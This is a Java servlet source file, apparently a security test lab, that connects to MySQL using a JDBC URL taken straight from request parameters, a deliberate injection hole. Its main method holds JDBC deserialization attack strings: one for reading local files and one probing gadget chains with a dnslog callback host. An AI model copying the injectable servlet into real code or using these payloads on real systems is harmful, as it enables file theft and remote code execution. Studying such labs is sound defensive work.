package online.sh1rosec.servlet;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.sql.DriverManager;
import java.sql.SQLException;

/**
 * @author sh1ro
 * @date 2022/12/25
 * @description
 */
public class MysqlConnectServlet extends HttpServlet {
    static {
        try {
            Class.forName("com.mysql.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String dbUrl = req.getParameter("db_url");
        String dbUser = req.getParameter("db_user");
        String dbPass = req.getParameter("db_pass");
        if (dbUrl != null && !dbUrl.isEmpty() && dbUser != null && dbPass != null) {
//            resp.getWriter().println("dburl" + dbUrl + "\ndbUser" + dbUser + "\ndbPass" + dbPass);
            String connectStr=dbUrl+"&user="+dbUser+"&pass="+dbPass;
            try {
                DriverManager.getConnection(connectStr);
            } catch (SQLException e) {
                throw new RuntimeException(e);
            }
        }
        else {
            resp.getWriter().println("骚年，不能为空哦");
        }

    }

    public static void main(String[] args) throws Exception {

        String db_url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&maxAllowedPacket=655360&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&allowUrlInLocalInfile=true&user=fileread_file:///";
        String test="jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&maxAllowedPacket=655360&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&allowUrlInLocalInfile=true&user=yso_FindGd_all:bb.testzz.dnslog.pw&pass=123456";
        DriverManager.getConnection(test);
    }
}
